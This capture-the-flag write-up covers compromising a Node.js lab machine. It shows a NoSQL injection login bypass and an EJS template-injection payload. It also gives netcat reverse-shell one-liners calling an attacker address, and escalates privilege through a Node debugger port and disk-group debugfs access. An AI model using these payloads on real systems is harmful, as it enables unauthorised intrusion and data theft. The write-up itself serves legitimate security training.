
# Do Not Disturb - Writeup

Let's start by looking for open ports with Nmap as usual and see what our starting point will be.

![image1](images/do_not_distrub_image_1.png)

We only have two open ports: SSH service running on port **22** and a **Node.js** application running on port **80**.

Let's check out the web application:

![image2](images/do_not_distrub_image_2.png)

All we have here is a login page expecting a **Staff/Guest ID** and a **passphrase**.

Looking around in the source code, nothing special could be found. So we continue our enumeration, this time checking for directories and subdomains. The result from `ffuf` is the following:

![image3](images/do_not_distrub_image_3.jpg)

We found a `/staff` endpoint, so let's check it out:

![image4](images/do_not_distrub_image_4.png)

As you can see, we get hit with a **403 Forbidden** HTTP response code. This is expected because it's only accessible to authenticated users, so we need to find a way to get in.

I first tried several injection techniques, including XSS, to see if I could trigger requests to a server under my control, but nothing worked. I also attempted classic SQL injection manually and with **SQLmap**, without success.

After some research, I remembered that **Node.js** applications commonly rely on **MongoDB** or other NoSQL databases. I then tested a few payloads from **PayloadsAllTheThings**, and one of them behaved differently from the others.

The working request was the following:

![image5](images/do_not_distrub_image_5.png)

By sending the following `POST` request from the login page:

```http
username=attendant&password[$ne]=1
```

the usual **401 Unauthorized** response changed to a **302 Redirect** toward `/staff`, and a valid session cookie was issued.

We didn't immediately gain access to the `/staff` page in the browser, so we manually saved the session cookie using the browser's Developer Tools. After refreshing the page, we were greeted with the following dashboard:

![image6](images/do_not_distrub_image_6.png)

We now have access to an input field that renders a customizable **EJS template**.

After looking into EJS, I found that it is:

> A simple template engine used in web development to build dynamic HTML pages using plain JavaScript code inside HTML.

![image7](images/do_not_distrub_image_7.png)

While reading the official documentation, I came across the following statement from the EJS GitHub repository:

> "EJS is effectively a JavaScript runtime. Its entire job is to execute JavaScript. If you run the EJS render method without checking the inputs yourself, you are responsible for the results."

I first tested a simple payload executing the `id` command to verify whether the template engine was vulnerable.

It worked.

I then started a Netcat listener on my attack machine and used the following payload to obtain a reverse shell:

```javascript
<%= eval(process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.XXX.XXX 9001 >/tmp/f')) %>
```

From there, obtaining the **user flag** was straightforward.

# Privilege Escalation

The next objective is escalating our privileges to obtain the root flag.

I first checked the usual privilege escalation vectors such as:

- Cron jobs
- Writable root-owned files
- SUID/SGID binaries

Unfortunately, none of them were exploitable.

Next, I listed the running processes:

```bash
ps -aux
```

One process immediately stood out:

```text
pipelin+     598  0.0  2.2 988568 45260 ?        Ssl  07:53   0:00 /usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

Running a Node.js application with the `--inspect` flag enables the built-in debugging interface over WebSockets.

More importantly, any JavaScript executed through this debugger runs with the privileges of the process owner, which is `pipelinesvc` in this case.

The first step is retrieving the debugger's WebSocket endpoint. According to the Node.js documentation, requesting `/json` on the debugging port provides all the required information.

```bash
curl http://127.0.0.1:9229/json
```

The output contains the WebSocket debugging URL.

Normally, we could connect using tools such as `wscat` or `websocat`, but neither was installed on the target machine. Instead, I decided to perform reverse port forwarding over SSH.

Before that, I stabilized my shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then I connected back to my attack machine:

```bash
ssh -R 9229:127.0.0.1:9229 ctfuser@192.168.XXX.XXX
```

After opening `chrome://inspect` in a Chromium-based browser, the remote Node.js process became visible.

From the DevTools JavaScript console, I confirmed the execution context:

```javascript
require('child_process').execSync('id').toString()

// Output:
// uid=995(pipelinesvc) gid=995(pipelinesvc)
// groups=995(pipelinesvc),6(disk)
```

The important observation here is that **`pipelinesvc` belongs to the `disk` group**.

Using the same technique as before, I spawned another reverse shell, this time as `pipelinesvc`:

```javascript
require('child_process').execSync('rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|sh -i 2>&1|nc 192.168.XXX.XXX 9002 >/tmp/f2')
```

Membership in the `disk` group grants raw read access to block devices.

This means we can directly inspect the filesystem using `debugfs`:

```bash
debugfs /dev/nvme0n1p1
```

Inside `debugfs`, reading the root flag is trivial:

```text
debugfs: cat /root/root.txt
```

And just like that, we obtain the **root flag**, completing the machine.

